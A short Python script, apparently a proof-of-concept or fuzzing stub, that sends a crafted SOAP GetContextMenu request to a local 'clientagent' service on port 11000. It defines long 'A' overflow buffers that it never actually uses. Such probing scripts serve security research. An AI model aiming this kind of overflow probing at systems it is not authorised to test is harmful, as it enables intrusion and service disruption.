#!/usr/bin/python

import requests
import json
import html

action_payload=100000*"A"
bmaUrl="http://localhost:11000/clientagent"
header={"User-Agent":"gSOAP/2.7",
	"Content-Type":"text/xml; charset=utf-8",
	"SOAPAction":""
	}

payload=100*"\x41"

SOAPMsg='<?xml version="1.0" encoding="UTF-8"?> \
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:TrayNotifierClient="http://tempuri.org/TrayNotifierClient.xsd" xmlns:traynotifierclient="urn:TrayNotifierClient"> \
	<SOAP-ENV:Body> \
<traynotifierclient:GetContextMenu> \
</traynotifierclient:GetContextMenu>\
	</SOAP-ENV:Body> \
</SOAP-ENV:Envelope>'

try:
	r=requests.post(bmaUrl, data=SOAPMsg.encode('utf-8'), headers=header)
except requests.exceptions.RequestException as err:
	print("[-] Error...")
	print(err)
try:
	print(r)
	print(r.text)
except NameError as err:
	print("[-] Error...")
	print(err)
	print(err.text)
